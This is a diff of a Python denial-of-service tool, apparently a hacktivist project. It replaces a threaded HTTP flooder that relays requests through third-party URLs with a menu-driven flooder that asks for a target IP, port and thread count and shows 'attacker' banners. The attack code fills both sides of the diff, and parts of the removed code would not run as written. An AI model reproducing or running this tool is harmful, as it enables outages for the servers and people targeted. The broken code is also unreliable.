@@ -1,186 +1,118 @@
-#!/usr/bin/python3
-# -*- coding: utf-8 -*-
-
-import logging
-import random
+ #!/usr/bin/python3
+import os
 import socket
-import sys
 import threading
 import time
-import urllib.request
-from optparse import OptionParser
-from queue import Queue
-from rich import print
-from rich.text import Text
+import random
+import sys
+import requests
+import colorama
+from colorama import Fore, Style
+import aiohttp
+import asyncio
+def DDoS():
+    os.system("clear")
+    print("press CTRL + C and press ENTER to exit !!!")
+    while True:
+        try:
+            threads = int(input("ENTER NUMBER OF THREADS : "))
+        except ValueError:
+            print("please enter a integer value")
+            continue;
+        else:
+            break;
+    attack_num = 0
+    trget = str(input(Fore.GREEN + Style.BRIGHT + "ENTER IP OF THE HOST :  "))
+    fake = '192.178.1.38'
+    #port = 80( default http port is 80)
+    while True:
+        try:
+            port = int(input("ENTER PORT (default port : 80 ) : ") or 80)
+        except ValueError:
+            print("Please enter a valid port , please try again")
+            continue;
+        else:
+            break;
+    print(f"performing DdoS on {trget} on PORT {port} using FAKE IP {fake} ")
+    print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect,you can restart the script and again enter the details correctly!!")
+   # print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " Press CTRL + C and press Enter to Exit!")
+    #print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.WHITE + "Press CTRL + C and press enter to exit!!")
+    time.sleep(4)
+    print(Fore.MAGENTA + Style.BRIGHT + "DDos starting in ~")
+    print("seconds : 3")
+    time.sleep(1)
+    print("seconds : 2")
+    time.sleep(1)
+    print("seconds : 1")
+    time.sleep(1)
 
-# Logo Twin Lion
-def print_logo():
-    logo = Text(""" ⚡⚡ TL-Base ⚡⚡ 
-TWIN LION""", style="bold magenta")
-    print(logo)
+    def attack():
+        nonlocal attack_num
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((trget, port))
+                s.sendto(("GET /" + trget + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
+                s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
-# Fungsi utama
-def main():
-    print_logo()
-    print("Ahlan Wa Sahlan!")
+                attack_num += 1
+                print("packet send!! attack number : "+ str(attack_num))
+            except socket.error:
+                print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK IP OR PORT')
+                break
+                s.close()
 
+    for i in range(threads):
+        thread = threading.Thread(target=attack)
+        thread.start()
+def print_red_centered_art():
+    os.system("clear")
+    art = '''
+    @ @ @ @@ @ @ @  @@         @  @@     @@  @@@@@@@@ 
+          @@        @@         @  @@     @@  @@    @@ 
+          @@        @@    @    @  @@     @@  @@    @@ 
+          ©©        ©©    @    ©  ©©     @@  @@    @@
+          ©©        ©©    @    ©  ©©     @@  @@    @@ 
+          ©©         ©© ©  @ ©    ©©     ©©  ©©    ©©
+          °°           °°   °°    °°     °°  °°    °° 
+           •            °   °      °      °   °     °
+                     @@          @@        @@ @         @@     @
+                     @@          @@      @@     @       @@ @   @
+                     @@          ©©      @@     @       @@  @  @
+                     ©©          ©©      ©©     ©       ©©   © ©
+                     ©© © ©      ©©        ©© ©         ©©     ©
+                     °°          °°         °°          °°     °
+                      °          °           °           °     ° '''
+    red_art = f"{Fore.BLUE}{art}{Style.RESET_ALL}"  # Set the text color to red
+    print(red_art.center(80))  # Adjust the width (80 characters) to match your terminal size
+    #red_art2 = f"{Fore.RED}{art2}{Style.RESET_ALL}"
+    art2 = '''||================================================================||
+||     B R I G A D E  A T T A C K E R  S N I P E R  E L I T E      
+||                     W I T H   P A L E S T I N E                 
+||               BIRRUH BIDAM               NAFDIKA YAA AQSHO
+||============================ 𒈞cwp_TL𒈞 ===========================||                                                          
+''' 
+    red_art2 = f"{Fore.YELLOW}{art2}{Style.RESET_ALL}"
+    print(red_art2.center(80))
+    print(Fore.YELLOW + Style.BRIGHT + "[Khanza's dedication and struggle for PALESTINE]")
 if __name__ == "__main__":
-    main()
-
-
-def user_agent():
-    global useragent
-    useragent = ["Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
-                 "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
-                 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
-                 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR "
-                 "3.5.30729)",
-                 "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 "
-                 "Chrome/16.0.912.63 Safari/535.7",
-                 "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR "
-                 "3.5.30729)",
-                 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
-    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0"]
-    return useragent
-
-
-def my_bots():
-    global bots
-    bots = ["http://validator.w3.org/check?uri=", "http://www.facebook.com/sharer/sharer.php?u="]
-    return bots
-
-
-def bot_TL-DdoS(url):
-    try:
-        while True:
-            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(useragent)}))
-            print("\033[94mbot is TL-DdoS...\033[0m")
-            time.sleep(.1)
-    except:
-        time.sleep(.1)
-
-
-def down_it(item):
-    try:
-        while True:
-            packet = str(
-                "GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(useragent) + "\n" + data).encode(
-                'utf-8')
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, int(port)))
-            if s.sendto(packet, (host, int(port))):
-                s.shutdown(1)
-                print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet terkirim! hammering--> \033[0m")
-            else:
-                s.shutdown(1)
-                print("\033[91mshut<->down\033[0m")
-            time.sleep(.1)
-    except socket.error as e:
-        print("\033[91mno koneksi! server sedang down\033[0m")
-        # print("\033[91m",e,"\033[0m")
-        time.sleep(.1)
-
-
-def dos():
-    while True:
-        item = q.get()
-        down_it(item)
-        q.task_done()
-
-
-def dos2():
-    while True:
-        item = w.get()
-        bot_TL-Ddos(random.choice(bots) + "http://" + host)
-        w.task_done()
-
-
-def usage():
-    print(''' \033[92m	TL-DDos Attack Tool v1.0''')
-    It is the end user's responsibility to obey all applicable laws.
-    It is just for server testing script. Your ip is visible. \n
-    usage : python3 TL-Ddos.py 
-
-
-def get_parameters():
-    global host
-    global port
-    global thr
-    global item
-    optp = OptionParser(add_help_option=False, epilog="TL-Ddos")
-    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel",
-                    const=logging.ERROR, default=logging.INFO)
-    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
-    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
-    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="default 135 -t 135")
-    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
-    opts, args = optp.parse_args()
-    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
-    if opts.help:
-        usage()
-    if opts.host is not None:
-        host = opts.host
+    print_red_centered_art()
+def menu():
+   # print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" Fore.WHITE + "Press CTRL + C and press enter to exit!!")
+    print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.BLUE + "Press CTRL + C and press enter to exit!!")
+    print(Fore.WHITE + Style.BRIGHT + "——————————————————————————————————————————————————————————————————————")
+    print(Fore.YELLOW + Style.BRIGHT + "Silahkan ketik 1 untuk melanjutkan...")
+    print(Fore.BLUE + Style.BRIGHT + "1. DDos a website.  [1]")
+    print(Fore.WHITE + Style.BRIGHT + "2. exit.            [2]")
+    print("Enter your options .. [e.g 1,2]") 
+    global usr
+    usr = input(Fore.BLUE + Style.BRIGHT + "0======>> " )
+    if usr == "1":
+        DDoS()
+    elif usr == "2":
+        print("Exiting...")
+        time.sleep(1)
     else:
-        usage()
-    if opts.port is None:
-        port = 80
-    else:
-        port = opts.port
-    if opts.turbo is None:
-        thr = 135
-    else:
-        thr = opts.turbo
-
-
-# reading headers
-global data
-headers = open("headers.txt", "r")
-data = headers.read()
-headers.close()
-# task queue are q,w
-q = Queue()
-w = Queue()
-
-if __name__ == '__main__':
-    if len(sys.argv) < 2:
-        usage()
-    get_parameters()
-    print("\033[92m", host, " port: ", str(port), " turbo: ", str(thr), "\033[0m")
-    print("\033[94mMohon tunggu...\033[0m")
-    user_agent()
-    my_bots()
-    time.sleep(5)
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((host, int(port)))
-        s.settimeout(1)
-    except socket.error as e:
-        print("\033[91mcek server ip dan port\033[0m")
-        usage()
-    while True:
-        for i in range(int(thr)):
-            t = threading.Thread(target=dos)
-            t.daemon = True  # if thread is exist, it dies
-            t.start()
-            t2 = threading.Thread(target=dos2)
-            t2.daemon = True  # if thread is exist, it dies
-            t2.start()
-        start = time.time()
-        # tasking
-        item = 0
-        while True:
-            if (item > 1800):  # for no memory crash
-                item = 0
-                time.sleep(.1)
-            item = item + 1
-            q.put(item)
-            w.put(item)
-        q.join()
-        w.join()
-    
-    
-    
-    
+        print("invalid option..try again.")
+        menu()
+menu()
